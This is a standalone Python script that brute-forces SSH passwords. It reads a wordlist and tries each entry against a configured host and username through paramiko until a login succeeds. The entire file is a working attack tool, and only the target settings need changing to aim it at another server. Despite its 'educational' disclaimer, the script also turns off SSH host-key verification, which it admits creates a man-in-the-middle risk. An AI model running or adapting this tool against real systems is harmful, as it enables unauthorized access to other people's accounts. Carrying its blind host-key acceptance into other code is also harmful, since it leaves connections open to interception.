#!/usr/bin/env python3
"""
SSH password brute forcing tool.
For educational purposes and authorized security testing only.

WARNING: This script uses AutoAddPolicy() which automatically accepts
all SSH host keys without verification. This is acceptable for testing
environments but creates a Man-in-the-Middle (MITM) vulnerability.
"""
from pwn import *
import paramiko

# Configuration
host = "127.0.0.1"
username = "notroot"
password_file = "ssh-common-passwords.txt"
attempts = 0

print("[*] Starting SSH brute force attack")
print(f"[*] Target: {host}")
print(f"[*] Username: {username}")
print(f"[*] Password list: {password_file}")
print("-" * 50)

try:
    with open(password_file, "r") as password_lists:
        for password in password_lists:
            password = password.strip("\n")
            try:
                print("[{}] Attempting password: '{}'".format(attempts, password))
                client = paramiko.SSHClient()
                # WARNING: AutoAddPolicy accepts any host key (MITM risk)
                # For production use: client.load_system_host_keys()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    hostname=host,
                    username=username,
                    password=password,
                    timeout=3,
                    look_for_keys=False,
                    allow_agent=False
                )
                print("[>] Valid password found: '{}'!".format(password))
                client.close()
                break
            except paramiko.ssh_exception.AuthenticationException:
                print("[X] Invalid password")
            except paramiko.ssh_exception.SSHException as e:
                print("[!] SSH error: {}".format(e))
            except socket.error as e:
                print("[!] Connection error: {}".format(e))
                print("[!] Retrying...")
            except Exception as e:
                print("[!] Unexpected error: {}".format(e))
            finally:
                attempts += 1

except FileNotFoundError:
    print(f"[!] Error: Password file '{password_file}' not found")
except KeyboardInterrupt:
    print("\n[!] Attack interrupted by user")

print("-" * 50)
print(f"[*] Total attempts: {attempts}")
